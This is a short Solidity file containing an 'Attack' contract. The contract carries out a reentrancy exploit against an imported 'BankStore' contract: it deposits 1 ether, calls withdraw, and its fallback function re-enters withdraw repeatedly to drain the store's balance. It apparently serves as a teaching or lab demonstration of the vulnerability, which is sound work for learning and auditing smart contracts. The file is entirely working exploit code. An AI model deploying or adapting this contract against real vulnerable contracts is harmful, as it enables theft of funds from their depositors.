// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "contracts/BankStore.sol";

contract Attack {
    BankStore public store;

    constructor(address _storeAddress) {
        store = BankStore(_storeAddress);
    }

    // Fallback is called when Store sends Ether to this contract.
    fallback() external payable {
        if (address(store).balance >= 1 ether) {
            store.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        store.deposit{value: 1 ether}();
        store.withdraw();
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}